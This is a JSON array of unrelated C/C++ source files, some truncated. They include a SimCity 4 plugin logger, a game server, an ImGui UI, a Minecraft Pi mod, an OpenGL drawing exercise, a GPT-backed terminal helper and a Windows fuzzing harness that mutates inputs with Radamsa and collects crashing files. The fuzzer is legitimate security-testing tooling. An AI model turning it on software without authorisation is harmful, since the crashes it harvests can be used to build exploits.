[
    "/*\n * This file is part of nam-dll, a DLL Plugin for SimCity 4\n * that improves interoperability with the Network Addon Mod.\n *\n * Copyright (c) 2023 NAM Team contributors\n *\n * nam-dll is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation, either version 3 of\n * the License, or (at your option) any later version.\n *\n * nam-dll is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with nam-dll.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"Logger.h\"\n#include <Windows.h>\n\nnamespace\n{\n\tstd::string GetTimeStamp()\n\t{\n\t\tchar buffer[1024]{};\n\n\t\tGetTimeFormatA(\n\t\t\tLOCALE_USER_DEFAULT,\n\t\t\t0,\n\t\t\tnullptr,\n\t\t\tnullptr,\n\t\t\tbuffer,\n\t\t\t_countof(buffer));\n\n\t\tstd::string time(buffer);\n\n\t\t// Add a space to the end of the time string if it does not have one.\n\t\tif (time.size() > 0 && time[time.size() - 1] != ' ')\n\t\t{\n\t\t\ttime.append(1, ' ');\n\t\t}\n\n\t\treturn time;\n\t}\n\n#ifdef _DEBUG\n\tvoid PrintLineToDebugOutput(const char* timeStamp, const char* line)\n\t{\n\t\tOutputDebugStringA(timeStamp);\n\t\tOutputDebugStringA(line);\n\t\tOutputDebugStringA(\"\\n\");\n\t}\n#endif // _DEBUG\n}\n\nLogger& Logger::GetInstance()\n{\n\tstatic Logger logger;\n\n\treturn logger;\n}\n\nLogger::Logger() : initialized(false), logFile(), logLevel(LogLevel::Error)\n{\n}\n\nLogger::~Logger()\n{\n\tinitialized = false;\n}\n\nvoid Logger::Init(std::filesystem::path logFilePath, LogLevel options)\n{\n\tif (!initialized)\n\t{\n\t\tinitialized = true;\n\n\t\tlogFile.open(logFilePath, std::ofstream::out | std::ofstream::trunc);\n\t\tlogLevel = options;\n\t}\n}\n\nbool Logger::IsEnabled(LogLevel level) const\n{\n\treturn logLevel >= level;\n}\n\nvoid Logger::WriteLogFileHeader(const char* const text)\n{\n\tif (initialized && logFile)\n\t{\n\t\tlogFile << text << std::endl;\n\t}\n}\n\nvoid Logger::WriteLine(LogLevel level, const char* const message)\n{\n\tif (!IsEnabled(level))\n\t{\n\t\treturn;\n\t}\n\n\tWriteLineCore(message);\n}\n\nvoid Logger::WriteLineFormatted(LogLevel level, const char* const format, ...)\n{\n\tif (!IsEnabled(level))\n\t{\n\t\treturn;\n\t}\n\n\tva_list args;\n\tva_start(args, format);\n\n\tva_list argsCopy;\n\tva_copy(argsCopy, args);\n\n\tint formattedStringLength = std::vsnprintf(nullptr, 0, format, argsCopy);\n\n\tva_end(argsCopy);\n\n\tif (formattedStringLength > 0)\n\t{\n\t\tsize_t formattedStringLengthWithNull = static_cast<size_t>(formattedStringLength) + 1;\n\n\t\tstd::unique_ptr<char[]> buffer = std::make_unique_for_overwrite<char[]>(formattedStringLengthWithNull);\n\n\t\tstd::vsnprintf(buffer.get(), formattedStringLengthWithNull, format, args);\n\n\t\tWriteLineCore(buffer.get());\n\t}\n\n\tva_end(args);\n}\n\nvoid Logger::WriteLineCore(const char* const message)\n{\n\tif (initialized && logFile)\n\t{\n\t\tstd::string timeStamp = GetTimeStamp();\n\n#ifdef _DEBUG\n\t\tPrintLineToDebugOutput(timeStamp.c_str(), message);\n#endif // _DEBUG\n\n\t\tlogFile << timeStamp << message << std::endl;\n\t}\n}",
    "#include <windows.h>\n#include <cstdio>\n#include <tchar.h>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <iomanip>\n#include <ctime>\n#include <vector>\n#include <string>\n#include <strsafe.h>\n#include <cstdlib>\n#include <filesystem>\n#include \"CLI11.hpp\"\n\n#define RPATH TEXT(\"RADAMSA_PATH\")\n#define BUFSIZE 256\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\nint TIMEOUT = 1000;\nstring originalFolder;\n\nvector<string> listFilesInDirectory(const std::string& directoryPath) {\n    vector<string> fileNames;\n    const fs::path dest = directoryPath;\n    for (const auto& entry : fs::directory_iterator(directoryPath)) {\n        fileNames.push_back(entry.path().filename().string());\n    }\n    return fileNames;\n}\n\nstring removeExtension(const string& filename) {\n    size_t dotPos = filename.rfind('.');\n    if (dotPos == string::npos) {\n        return filename;\n    }\n    return filename.substr(0, dotPos);\n}\n\n\nBOOL mutateInputs(const string& filename, const string& mut, const string& inputFolder, const string& outputFolder, string ext)\n{ \n    string nfilename = removeExtension(filename);\n    string outputFileName = outputFolder + \"\\\\\" + nfilename + \"_id=\" + mut + \".\" + ext;\n    STARTUPINFOA si;\n    PROCESS_INFORMATION pi;\n    DEBUG_EVENT debug_event;\n    string args = \"radamsa.exe \" + inputFolder + \"\\\\\" + filename + \" -m \" + mut + \" -o \" + outputFileName;\n    LPSTR cmd = (LPSTR)args.c_str();\n\n    ZeroMemory(&si, sizeof(si));\n    ZeroMemory(&pi, sizeof(pi));\n    si.cb = sizeof(si);\n\n    if (!CreateProcessA(\n        nullptr,           // Target app\n        cmd,                 // Command line\n        nullptr,           // Process handle not inheritable\n        nullptr,            // Thread handle not inheritable\n        FALSE,                // Set handle inheritance to FALSE\n        0,                   // No creation flag\n        nullptr,               // Use parent's environment block\n        nullptr,            // Use parent's starting directory\n        &si,                    // Pointer to STARTUPINFO structure\n        &pi)              // Pointer to PROCESS_INFORMATION structure\n        )\n    {\n        printf(\"CreateProcess failed GLE=(%lu).\\n\", GetLastError());\n        return 1;\n    }\n\n    // Wait until child process exits.\n    WaitForSingleObject(pi.hProcess, INFINITE);\n\n    // Close process and thread handles\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n\n    return TRUE;\n}\n\nvoid reportCrash(const string& exceptionMessage, DWORD exceptionCode, const string& inputFile)\n{\n    string crashFolder = originalFolder + \"crashes\";\n    if (!fs::exists(crashFolder)) \n    {\n        fs::create_directory(crashFolder);\n    }\n    string filename = crashFolder + \"\\\\\" + \"crashes_log\" + \".txt\";\n    ofstream outfile(filename, ios::app); \n    outfile << exceptionMessage << hex << exceptionCode << \"with file: \" << inputFile << endl;\n    outfile.close();\n\n    fs::path source = inputFile;\n    fs::path dest = crashFolder + inputFile;\n    fs::copy(source, dest);\n\n}\n\nDWORD ProcessDebugEvent(DEBUG_EVENT* debugEvent, const string& inputFile)\n{\n    if (debugEvent->dwDebugEventCode == EXCEPTION_DEBUG_EVENT)\n    {\n\n        EXCEPTION_RECORD* exceptionRecord = &debugEvent->u.Exception.ExceptionRecord;\n        DWORD exceptionCode = exceptionRecord->ExceptionCode;\n\n        switch (exceptionCode)\n        {\n        case EXCEPTION_BREAKPOINT:\n            break;\n        case EXCEPTION_ACCESS_VIOLATION:\n            reportCrash(\"Critical exception: Access Violation (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ARRAY_BOUNDS_EXCEEDED:\n            reportCrash(\"Critical exception: Array Bounds Exceeded (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_DENORMAL_OPERAND:\n            reportCrash(\"Critical exception: Invalid floating-point operation (denormal operand) (0x\", exceptionCode,\n                        inputFile);\n            break;\n\n        case EXCEPTION_FLT_DIVIDE_BY_ZERO:\n            reportCrash(\"Critical exception: Floating-point division by zero (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_OVERFLOW:\n            reportCrash(\"Critical exception: Floating-point overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_STACK_CHECK:\n            reportCrash(\"Critical exception: Hardware floating-point stack overflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_FLT_UNDERFLOW:\n            reportCrash(\"Critical exception: Floating-point underflow (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_ILLEGAL_INSTRUCTION:\n            reportCrash(\"Critical exception: Illegal instruction encountered (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEPTION_IN_PAGE_ERROR:\n            reportCrash(\"Critical exception: Page fault (0x\", exceptionCode, inputFile);\n            break;\n\n        case EXCEP",
    "#include \"server/server.hpp\"\n\n#include <boost/asio/io_context.hpp>\n#include <boost/asio/ip/udp.hpp>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/archive/text_oarchive.hpp>\n\n#include <cassert>\n#include <algorithm>\n#include <iostream>\n#include <fstream>\n#include <ostream>\n#include <thread>\n#include <chrono>\n\n#include \"boost/variant/get.hpp\"\n#include \"server/game/enemy.hpp\"\n#include \"server/game/player.hpp\"\n#include \"shared/game/event.hpp\"\n#include \"server/game/servergamestate.hpp\"\n#include \"server/game/object.hpp\"\n#include \"server/game/boxcollider.hpp\"\n#include \"shared/network/session.hpp\"\n#include \"shared/network/packet.hpp\"\n#include \"shared/network/constants.hpp\"\n#include \"shared/utilities/config.hpp\"\n\nusing namespace std::chrono_literals;\nusing namespace boost::asio::ip;\n\nServer::Server(boost::asio::io_context& io_context, GameConfig config)\n    :lobby_broadcaster(io_context, config),\n     acceptor(io_context, tcp::endpoint(tcp::v4(), config.network.server_port)),\n     socket(io_context),\n     world_eid(0),\n     state(ServerGameState(GamePhase::LOBBY, config))\n{\n    _doAccept(); // start asynchronously accepting\n\n    if (config.server.lobby_broadcast) {\n        this->lobby_broadcaster.startBroadcasting(ServerLobbyBroadcastPacket {\n            .lobby_name  = config.server.lobby_name,\n            .slots_taken = 0,\n            .slots_avail = config.server.max_players});\n    }\n}\n\n//  Note: This method should probably be removed since EntityIDs for objects\n//  are assigned by the ObjectManager\nEntityID Server::genNewEID() {\n    static EntityID id = 1;\n    return id++;\n}\n\nvoid Server::updateGameState(const EventList& events) {\n    // TODO: remove cppcheck suppress when src_eid is being used\n\n    // TODO : validate events if necessary\n    this->state.update(events);\n}\n\nEventList Server::getAllClientEvents() {\n    EventList allEvents;\n\n    // Loop through each session\n    for (const auto& [eid, _ip, session] : this->sessions) { // cppcheck-suppress unusedVariable\n        if (auto s = session.lock()) {\n            // Get events from the current session\n            std::vector<Event> sessionEvents = s->getEvents();\n\n            // Put events into the allEvents vector, prepending each event with the id of the \n            // client that requested it\n            std::transform(sessionEvents.begin(), sessionEvents.end(), std::back_inserter(allEvents), \n                [eid](const Event& e) {\n                    return std::make_pair(eid, e);\n                });\n        }\n    }\n\n    return allEvents;\n}\n\nvoid Server::sendUpdateToAllClients(Event event) {\n    for (const auto& [_eid, _ip, session] : this->sessions) { // cppcheck-suppress unusedVariable\n        if (auto s = session.lock()) {\n            s->sendEventAsync(event);\n        }\n    }\n}\n\nstd::chrono::milliseconds Server::doTick() {\n    auto start = std::chrono::high_resolution_clock::now();\n\n    switch (this->state.getPhase()) {\n        case GamePhase::LOBBY:\n            // Go through sessions and update GameState lobby info\n            // TODO: move this into updateGameState or something else\n            for (const auto& [eid, ip, session]: this->sessions) {\n                if (auto s = session.lock()) {\n                    this->state.addPlayerToLobby(eid, s->getInfo().client_name.value_or(\"UNKNOWN NAME\"));\n                } else {\n                    this->state.removePlayerFromLobby(eid);\n                }\n            }\n\n            if (this->state.getLobby().players.size() >= this->state.getLobby().max_players) {\n                this->state.setPhase(GamePhase::GAME);\n                // TODO: figure out how to selectively broadcast to only the players that were already in the lobby\n                // this->lobby_broadcaster.stopBroadcasting();\n            } else {\n                std::cout << \"Only have \" << this->state.getLobby().players.size()\n                    << \"/\" << this->state.getLobby().max_players << \"\\n\";\n            }\n\n            this->lobby_broadcaster.setLobbyInfo(this->state.getLobby());\n\n            sendUpdateToAllClients(Event(this->world_eid, EventType::LoadGameState, LoadGameStateEvent(this->state.generateSharedGameState())));\n            // Tell each client the current lobby status\n\n            std::cout << \"waiting for \" << this->state.getLobby().max_players << \" players\" << std::endl;\n\n            break;\n        case GamePhase::GAME: {\n            EventList allClientEvents = getAllClientEvents();\n\n            updateGameState(allClientEvents);\n\n            sendUpdateToAllClients(Event(this->world_eid, EventType::LoadGameState, LoadGameStateEvent(this->state.generateSharedGameState())));\n            break;\n        }\n        default:\n            std::cerr << \"Invalid GamePhase on server:\" << static_cast<int>(this->state.getPhase()) << std::endl;\n            std::exit(1);\n    }\n\n    // Calculate how long we need to wait until the next tick\n    auto stop = std::chrono::high_resolution_clock::now();\n    auto wait = std::chrono:",
    "#include <iostream>\n#include \"API/GPTCommunicator.h\"\n#include \"Utils/BashCommandExtractor.h\"\n#include \"Utils/FileHandler.h\"\n#include \"Utils/OutputHandler.h\"\n#include \"Utils/InputHandler.h\"\n\n#include <string>\n#include <nlohmann/json.hpp>\n#include <cpr/cpr.h>\n\n#include <regex>\n#include <vector>\n\n\n\nint main(int argc, char* argv[])\n{\n    std::string arg;\n    if(argc > 1) \n        arg = argv[1];\n\n    std::string context;\n#ifdef _WIN32\n    if (arg == \"-c\") {\n        context = readFromTerminal();\n    }\n#endif\n   \n    std::string query;\n    std::string response;\n#ifdef _WIN32\n    if (arg == \"-c\") {\n        std::cout << \"i am aware of the visible part of your cmd, how can i help you? \";\n        std::getline(std::cin, query);\n        response = chat_with_gpt(query, context);\n    }\n    else {\n        std::cout << \"what do you want to do in the cmd? \";\n        std::getline(std::cin, query);\n        response = chat_with_gpt(query, \"\");\n    }\n#else\n    std::cerr << \"what do you want to do? \";\n    std::getline(std::cin, query);\n    // send user input to chatgpt and recive the response\n    response = chat_with_gpt(query);\n#endif\n\n    // output the complete response message (not the complete json recived just the plain answer text)\n    outputResponse(response);\n    // extract the commands from the chat gpt answer\n    std::vector<std::string> commands = extract_bash_commands(response);\n\n    // handle what is done with the commands. its not possible to save them to history in windows\n#ifdef _WIN32\n    stdCoutCommandsWindows(commands);\n#else\n    // For the purpose of adding to history, print just the commands (linux with bash script):\n    stdCoutCommands(commands);\n    // system(\"script /home/adminlokal/projekte/terminalhelper/mylog.txt\");\n#endif\n\n    return 0;\n}\n",
    "#include \"gui.h\"\r\n\r\nusing namespace ImGui;\r\n\r\nint rotation_start_index;\r\nvoid ui::rotate_start( )\r\n{\r\n    rotation_start_index = GetWindowDrawList( )->VtxBuffer.Size;\r\n}\r\n\r\nImVec2 ui::rotation_center( )\r\n{\r\n    ImVec2 l( FLT_MAX, FLT_MAX ), u( -FLT_MAX, -FLT_MAX );\r\n\r\n    const auto& buf = GetWindowDrawList( )->VtxBuffer;\r\n    for ( int i = rotation_start_index; i < buf.Size; i++ )\r\n        l = ImMin( l, buf[i].pos ), u = ImMax( u, buf[i].pos );\r\n\r\n    return ImVec2( ( l.x + u.x ) / 2, ( l.y + u.y ) / 2 );\r\n}\r\n\r\nvoid ui::rotate_end( float rad, ImVec2 center )\r\n{\r\n    float s = sin( rad ), c = cos( rad );\r\n    center = ImRotate( center, s, c) - center;\r\n\r\n    auto& buf = GetWindowDrawList()->VtxBuffer;\r\n    for ( int i = rotation_start_index; i < buf.Size; i++ )\r\n        buf[i].pos = ImRotate( buf[i].pos, s, c ) - center;\r\n}\r\n\r\nvoid ui::render_step( const char* icon, const char* label, bool active ) {\r\n\tauto window = GetCurrentWindow( );\r\n\t\r\n\tImVec2 icon_size{ GetIO( ).Fonts->Fonts[2]->CalcTextSizeA( GetIO( ).Fonts->Fonts[2]->FontSize, FLT_MAX, -1, icon ) };\r\n\tImVec2 label_size{ GetIO( ).Fonts->Fonts[1]->CalcTextSizeA( GetIO( ).Fonts->Fonts[1]->FontSize, FLT_MAX, -1, label ) };\r\n\r\n\tImVec2 size{ icon_size.x + 11 + label_size.x, window->Size.y };\r\n\tImRect bb{ window->DC.CursorPos, window->DC.CursorPos + size };\r\n\r\n\tItemSize( bb );\r\n\tItemAdd( bb, 0 );\r\n\r\n\tfloat anim = ImTricks::Animations::FastFloatLerp( label, 0, active, 0.f, 1.f, anim_speed );\r\n\tauto icon_col = ImTricks::Animations::FastColorLerp( GetColorU32( ImGuiCol_TextDisabled ), GetColorU32( ImGuiCol_Scheme ), anim );\r\n\tauto label_col = ImTricks::Animations::FastColorLerp( GetColorU32( ImGuiCol_TextDisabled ), GetColorU32( ImGuiCol_Text ), anim );\r\n\r\n    circle_glow( { bb.Min.x + icon_size.x / 2 - 2, bb.GetCenter( ).y }, 0, GetColorU32( ImGuiCol_Scheme, 0.2f * anim ), 4.f );\r\n\r\n\twindow->DrawList->AddText( GetIO( ).Fonts->Fonts[2], GetIO( ).Fonts->Fonts[2]->FontSize, { bb.Min.x, bb.GetCenter( ).y - icon_size.y / 2 }, icon_col, icon );\r\n\twindow->DrawList->AddText( GetIO( ).Fonts->Fonts[1], GetIO( ).Fonts->Fonts[1]->FontSize, { bb.Min.x + icon_size.x + 11, bb.GetCenter( ).y - label_size.y / 2 }, label_col, label );\r\n}\r\n\r\nvoid ui::render_arrow( ImGuiDir dir, float sz ) {\r\n\tauto window = GetCurrentWindow( );\r\n\r\n\tImVec2 size{ sz, window->Size.y };\r\n\tImRect bb{ window->DC.CursorPos, window->DC.CursorPos + size };\r\n\r\n\tItemSize( bb );\r\n\tItemAdd( bb, 0 );\r\n\r\n\tRenderArrow( window->DrawList, { bb.Min.x, bb.GetCenter( ).y - sz / 3.f }, GetColorU32( ImGuiCol_TextDisabled ), dir, sz );\r\n}\r\n\r\nvoid ui::circle_glow( ImVec2 center, float radius, ImColor col, float intensity ) {\r\n    while ( true ) {\r\n        if ( col.Value.w < 0.0019f )\r\n            break;\r\n\r\n        GetWindowDrawList( )->AddCircleFilled( center, radius, col, 24 );\r\n\r\n        col.Value.w -= col.Value.w / intensity;\r\n        radius += 2;\r\n    }\r\n}\r\n\r\nvoid ui::rect_glow( ImDrawList* draw, ImVec2 start, ImVec2 end, ImColor col, float rounding, float intensity ) {\r\n    while ( true ) {\r\n        if ( col.Value.w < 0.0019f )\r\n            break;\r\n\r\n        draw->AddRectFilled( start, end, col, rounding );\r\n\r\n        col.Value.w -= col.Value.w / intensity;\r\n        start = ImVec2( start.x - 1, start.y - 1 );\r\n        end = ImVec2( end.x + 1, end.y + 1 );\r\n    }\r\n}\r\n\r\nvoid ui::render_background( ) {\r\n    auto d = GetWindowDrawList( );\r\n    ImVec2 center = { GetCurrentWindow( )->Rect( ).GetCenter( ).x, GetCurrentWindow( )->Rect( ).Max.y + 20 };\r\n\r\n    d->AddCircle( center, 50, GetColorU32( ImGuiCol_Scheme, 0.3f ), 0, 2 );\r\n    d->AddCircle( center, 100, GetColorU32( ImGuiCol_Scheme, 0.2f ), 0, 2 );\r\n    d->AddCircle( center, 180, GetColorU32( ImGuiCol_Scheme, 0.1f ), 0, 2 );\r\n    d->AddCircle( center, 260, GetColorU32( ImGuiCol_Scheme, 0.075f ), 0, 2 );\r\n}\r\n\r\nvoid ui::render_gradient( ImVec2 start, ImVec2 end, ImColor col1, ImColor col2, ImColor col3, ImColor col4, float rounding ) {\r\n    auto window = GetCurrentWindow( );\r\n    auto d = window->DrawList;\r\n\r\n    d->PushClipRect( start, start + rounding );\r\n    d->AddCircleFilled( start + rounding, rounding, col1 );\r\n    d->PopClipRect( );\r\n\r\n    d->PushClipRect( { start.x, end.y - rounding }, { start.x + rounding, end.y } );\r\n    d->AddCircleFilled( { start.x + rounding, end.y - rounding }, rounding, col4 );\r\n    d->PopClipRect( );\r\n\r\n    d->PushClipRect( { end.x - rounding, start.y }, { end.x, start.y + rounding } );\r\n    d->AddCircleFilled( { end.x - rounding, start.y + rounding }, rounding, col2 );\r\n    d->PopClipRect( );\r\n\r\n    d->PushClipRect( end - rounding, end );\r\n    d->AddCircleFilled( end - rounding, rounding, col3 );\r\n    d->PopClipRect( );\r\n\r\n    d->AddRectFilledMultiColor( { start.x, start.y + rounding }, { start.x + rounding, end.y - rounding }, col1, col1, col4, col4 );\r\n    d->AddRectFilledMultiColor( { end.x - rounding, start.y + rounding }, { end.x, end.y - rounding }, col2, col2, col3, col3 );\r\n    d->AddRectFilledMultiColor( { start.x + rounding",
    "// Some random tiny changes\n#include <libreborn/libreborn.h>\n#include <symbols/minecraft.h>\n#include <mods/misc/misc.h>\n\n#include \"init.h\"\n#include \"api.h\"\n\n// Defusing\nOVERWRITE_CALLS(PrimedTnt_interact_non_virtual, bool, PrimedTnt_interact, (PrimedTnt *self, Player *player)) {\n    ItemInstance *item = Inventory_getSelected(player->inventory);\n    if (item && item->id == 359) {\n        item->auxiliary -= 1;\n        // Spawn item\n        ItemInstance i = {.count = 1, .id = 46, .auxiliary = 1};\n        ItemEntity *item_entity = (ItemEntity *) EntityFactory_CreateEntity(64, self->level);\n        ALLOC_CHECK(item_entity);\n        ItemEntity_constructor(item_entity, self->level, self->x + 0.5f, self->y, self->z + 0.5f, &i);\n        Level_addEntity(self->level, (Entity *) item_entity);\n        // Remove tnt\n        self->vtable->remove(self);\n        return true;\n    }\n    return PrimedTnt_interact_non_virtual(self, player);\n}\n\n// Double doors\nOVERWRITE_CALLS(DoorTile_use_non_virtual, bool, DoorTile_use, (DoorTile *self, Level *level, int x, int y, int z, Player *player)) {\n    // Get data\n    int data = DoorTile_getCompositeData((LevelSource *) level, x, y, z);\n    bool offset = false;\n    if (data & 8) {\n        // It's upper\n        y -= 1;\n        offset = true;\n    }\n    // Get angle\n    int dir = data & 3;\n    int xo = 0, zo = 0;\n    if (dir == 0) {\n        zo = 1;\n    } else if (dir == 2) {\n        zo = -1;\n    } else if (dir == 1) {\n        xo = -1;\n    } else if (dir == 3) {\n        xo = 1;\n    }\n    // Flip\n    if (data & 16) {\n        xo = -xo;\n        zo = -zo;\n    }\n    // Set\n    if (level->vtable->getTile(level, x + xo, y, z + zo) == self->id) {\n        data = level->vtable->getData(level, x, y, z);\n        uchar new_data = level->vtable->getData(level, x + xo, y, z + zo);\n        if ((data ^ 4) == (new_data ^ 4)) new_data ^= 4;\n        Level_setTileAndData(level, x + xo, y, z + zo, self->id, new_data);\n    }\n    // Call original\n    return DoorTile_use_non_virtual(self, level, x, offset ? y + 1 : y, z, player);\n}\n\n// Swing through hitboxless block\nstatic Item_vtable *WeaponItem_vtable = (Item_vtable *) 0x10ef30;\nstatic bool clip_through_hitboxless = true;\nHOOK_FROM_CALL(0x7f5b0, HitResult, Level_clip, (Level *level, uchar *param_1, uchar *param_2, bool clip_liquids, bool param_3)) {\n    return Level_clip_original_FG6_API(level, param_1, param_2, clip_liquids, clip_through_hitboxless || param_3);\n}\nstatic void on_tick(Minecraft *mc) {\n    LocalPlayer *player = mc->player;\n    if (player != NULL) {\n        ItemInstance *item = Inventory_getSelected(player->inventory);\n        clip_through_hitboxless = item != NULL && Item_items[item->id]->vtable == WeaponItem_vtable;\n    }\n}\n\n// Shovel wacking\nHOOK_FROM_CALL(0x852f4, bool, Mob_hurt, (Mob *self, Entity *attacker, int damage)) {\n    bool ret = Mob_hurt_original_FG6_API(self, attacker, damage);\n    if (!ret || !attacker || !attacker->vtable->isPlayer(attacker)) return ret;\n    // Check inventory\n    Player *p = (Player *) attacker;\n    ItemInstance *iitem = Inventory_getSelected(p->inventory);\n    if (iitem == NULL) return ret;\n    // Check item\n    Item *item = Item_items[iitem->id];\n    if (item->vtable != (Item_vtable *) 0x10f960) return ret;\n    // WACK\n    float speed = ((DiggerItem *) item)->speed;\n    self->vel_x += attacker->vel_x * speed;\n    self->vel_y += attacker->vel_y * (speed / 7);\n    self->vel_z += attacker->vel_z * speed;\n    return ret;\n}\n\nTile *Tile_init_invBedrock_injection(Tile *t) {\n    Tile *ret = Tile_init(t);\n    // Fix inv bedrock name\n    std::string invBedrock = \"invBedrock\";\n    t->vtable->setDescriptionId(t, &invBedrock);\n    return ret;\n}\n\nvoid copy_with_still(std::string *into, char *from)\n{\n    *into = from;\n    *into += \"Still\";\n}\n\nvoid copy_with_carried(std::string *into, char *from)\n{\n    *into = std::string(from);\n    *into += \"Carried\";\n}\n\nstatic float Zombie_aiStep_getBrightness_injection(Entity *self, float param_1) {\n    // Thanks goodness for Mojank's love of hacky premature optimizations\n    if (self->vtable == (Entity_vtable *) 0x10cf50) return 0;\n    return self->vtable->getBrightness(self, param_1);\n}\n\nstatic Tile_getTexture2_t CarriedTile_getTexture2 = NULL;\nstatic int CarriedTile_getTexture2_injection(Tile *t, int face, int data) {\n    if (face == 0) return 2;\n    return CarriedTile_getTexture2(t, face, data);\n}\n\nstatic void Gui_renderProgressIndicator_GuiComponent_blit_injection(GuiComponent *self, int x_dest, int y_dest, int x_src, int y_src, int width_dest, int height_dest, int width_src, int height_src) {\n    if (mc->options.third_person == 0) {\n        GuiComponent_blit(self, x_dest, y_dest, x_src, y_src, width_dest, height_dest, width_src, height_src);\n        return;\n    }\n    return;\n}\n\nstatic ItemInstance *Recipes_ItemInstance_injection(ItemInstance *self, Item *i, int count, UNUSED int auxiliary) {\n    return ItemInstance_constructor_item_extra(self, i, count, -1);\n}\n\nchar grassCarried[] = \"gr",
    "/*\r\n * OpenGL.cpp\r\n *\r\n *  Created on: Abril 04, 2024\r\n *      Author: guiil_000\r\n */\r\n\r\n#include <GL/glut.h>\r\n#include <iostream>\r\n\r\nvoid Desenha(void) {\r\n\tglClear(GL_COLOR_BUFFER_BIT);\r\n\r\n\tgluOrtho2D(-5, 6, -4, 8);\r\n\r\n\tglBegin(GL_QUADS);\r\n\tfor (int i = -2; i <= 3; i++) {\r\n\t\tglColor3f(1, i, 0);\r\n\t\tglVertex2f(i, 2);\r\n\t\tglVertex2f(i, 4);\r\n\t}\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.6, 0.2, 0.8);\r\n\tglVertex2f(-4, 4);\r\n\tglVertex2f(5, 4);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.59, 0.29, 0);\r\n\tglVertex2f(-4, 4.5);\r\n\tglVertex2f(-4, -4);\r\n\tglVertex2f(-3.5, -4);\r\n\tglVertex2f(-3.5, 4.5);\r\n\r\n\tglVertex2f(5, 4.5);\r\n\tglVertex2f(5, -4);\r\n\tglVertex2f(4.5, -4);\r\n\tglVertex2f(4.5, 4.5);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_QUADS);\r\n\tglColor3f(0.72, 0.45, 0.2);\r\n\tglVertex2f(-1, -4);\r\n\tglVertex2f(0, -3);\r\n\tglVertex2f(1, -3);\r\n\tglVertex2f(2, -4);\r\n\tglEnd();\r\n\r\n\tglPointSize(7.0);\r\n\tglBegin(GL_POINTS);\r\n\tglColor3f(0.5, 0.5, 0.5);\r\n\tglVertex2f(0, 0);\r\n\tglVertex2f(0.5, -1);\r\n\tglVertex2f(0, -1);\r\n\tglVertex2f(0, -2);\r\n\tglVertex2f(-0.5, -2);\r\n\tglVertex2f(-0.5, -3);\r\n\tglVertex2f(1.5, -3);\r\n\tglVertex2f(1.5, -2);\r\n\tglVertex2f(1.5, -1);\r\n\tglVertex2f(1, -2);\r\n\tglVertex2f(0.5, -2);\r\n\tglEnd();\r\n\r\n\tglBegin(GL_LINES);\r\n\tglColor3f(0.53, 0.81, 0.98);\r\n\tglVertex2f(0, 5);\r\n\tglVertex2f(0.3, 6);\r\n\r\n\tglVertex2f(1, 2);\r\n\tglVertex2f(1.3, 3);\r\n\r\n\tglVertex2f(2, 1);\r\n\tglVertex2f(2.3, 2);\r\n\r\n\tglVertex2f(-1, -1);\r\n\tglVertex2f(-1.3, -2);\r\n\r\n\tglVertex2f(-2, -3);\r\n\tglVertex2f(-2.3, -4);\r\n\r\n\tglVertex2f(-4, 0);\r\n\tglVertex2f(-4.3, -1);\r\n\r\n\tglVertex2f(1, -1);\r\n\tglVertex2f(1.3, 0);\r\n\r\n\tglVertex2f(2, -3);\r\n\tglVertex2f(2.3, -2);\r\n\r\n\tglVertex2f(4, -4);\r\n\tglVertex2f(4.3, -3);\r\n\r\n\tglVertex2f(5, -2);\r\n\tglVertex2f(5.3, -1);\r\n\r\n\tglVertex2f(4, 3);\r\n\tglVertex2f(4.3, 4);\r\n\r\n\tglVertex2f(3, 2);\r\n\tglVertex2f(3.3, 3);\r\n\r\n\tglVertex2f(-3, 3);\r\n\tglVertex2f(-3.3, 2);\r\n\r\n\tglVertex2f(-4, 5);\r\n\tglVertex2f(-4.3, 4);\r\n\r\n\tglVertex2f(-2, 1);\r\n\tglVertex2f(-2.3, 0);\r\n\r\n\tglVertex2f(0, 1);\r\n\tglVertex2f(0.3, 2);\r\n\r\n\tglVertex2f(-0.3, 3);\r\n\tglVertex2f(-.6, 2);\r\n\r\n\tglVertex2f(-2, 5);\r\n\tglVertex2f(-2.3, 4);\r\n\r\n\tglVertex2f(-3, 6);\r\n\tglVertex2f(-3.3, 5);\r\n\r\n\r\n\tglVertex2f(3, 5);\r\n\tglVertex2f(3.3, 6);\r\n\r\n\r\n\tglVertex2f(2, 6);\r\n\tglVertex2f(2.3, 7);\r\n\r\n\r\n\tglVertex2f(-1, 7);\r\n\tglVertex2f(-1.3, 6);\r\n\r\n\r\n\tglVertex2f(4, 6);\r\n\tglVertex2f(4.3, 7);\r\n\r\n\tglVertex2f(3, -2);\r\n\tglVertex2f(3.3, -1);\r\n\r\n\tglEnd();\r\n\r\n\tglFlush();\r\n}\r\n\r\nint main(int argc, char** argv) {\r\n\tglutInit(&argc, argv);\r\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\r\n\tglutInitWindowSize(1000, 500);\r\n\tglutInitWindowPosition(120, 150);\r\n\tglutCreateWindow(\"Sad Junina\");\r\n\tglutDisplayFunc(Desenha);\r\n\tglutMainLoop();\r\n}\r\n\r\n",
